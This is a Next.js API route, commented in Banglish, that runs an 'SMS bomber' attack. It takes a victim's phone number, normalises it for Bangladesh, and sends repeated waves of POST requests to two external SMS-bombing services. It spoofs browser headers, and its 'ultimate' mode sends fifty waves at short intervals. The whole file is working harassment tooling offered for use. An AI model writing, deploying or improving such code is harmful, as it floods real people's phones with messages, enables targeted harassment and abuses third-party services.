// pages/api/attack.js

export default async function handler(req, res) {
  if (req.method !== 'POST') return res.status(405).send('Method not allowed');

  let { number, amount, isUltimate } = req.body;

  // 1. Number Cleaning (Shudhu digit rakhbe, +88 muche felbe)
  let cleanNumber = number.toString().replace(/\D/g, ''); 
  if (cleanNumber.startsWith('88')) {
    cleanNumber = cleanNumber.substring(2); 
  }

  // 2. Target Links (Amra ekhane direct API endpoint simulate korbo)
  const targetLinks = [
    'https://nuke-sms-bomber.pages.dev/',
    'https://shadowx-sms-bomber.onrender.com/'
  ];

  const runAttack = async () => {
    const totalWaves = isUltimate ? 50 : amount; 
    const delay = isUltimate ? 500 : 2000; 

    for (let i = 0; i < totalWaves; i++) {
      const attackPromises = targetLinks.map(async (baseUrl) => {
        try {
          // Amra ekhane ekta "Heavy Payload" pathacchi
          // Jeta site ke force korbe request accept korte
          const response = await fetch(baseUrl, {
            method: 'POST',
            headers: { 
              'Content-Type': 'application/json',
              'Accept': 'application/json, text/plain, */*',
              'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36',
              'Origin': baseUrl,
              'Referer': baseUrl,
              'X-Requested-With': 'XMLHttpRequest',
            },
            body: JSON.stringify({
              number: cleanNumber,
              phone: cleanNumber,
              target: cleanNumber,
              amount: 1,
              count: 1,
              country: "BD",
              service: "whatsapp",
              msg: "Ultimate Attack",
              auth: "true",
              token: "123456"
            }),
            mode: 'cors'
          });

          console.log(`[Wave ${i}] Hit: ${baseUrl} | Status: ${response.status}`);

        } catch (err) {
          console.error(`[Wave ${i}] Error: ${err.message}`);
        }
      });

      await Promise.all(attackPromises);
      await new Promise(resolve => setTimeout(resolve, delay));
    }
  };

  // Attack start
  runAttack();

  return res.status(200).json({ 
    success: true, 
    message: isUltimate ? "ULTIMATE ATTACK STARTED! 🚀" : "ATTACK STARTED! 🔥" 
  });
}
